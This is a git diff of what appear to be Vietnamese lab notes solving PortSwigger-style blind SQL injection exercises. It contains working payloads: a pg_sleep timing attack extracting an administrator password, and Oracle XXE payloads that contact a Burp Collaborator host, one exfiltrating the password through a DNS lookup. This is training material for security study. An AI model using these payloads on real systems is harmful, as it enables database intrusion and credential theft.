@@ -432,5 +432,22 @@ Bài lab này tương tự ngữ cảnh với những bài lab trên tuy nhiên 
 '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 ```
 
-=>Password = k 2 jez y u z w z c 8 q k g p r s 4 a
-k2jezyuzwzc8qkgprs4a
+=>Password = y2jezyuzwza8qobpru5h
+
+
+
+### Lab: Blind SQL injection with out-of-band interaction
+
+```
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//q3ud6kxkodplihevi7e58lcem5svgk.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
+
+
+
+
+
+### Lab: Blind SQL injection with out-of-band data exfiltration
+
+```
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.bvakjrgtvyopvshidlo74d58kzqpee.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
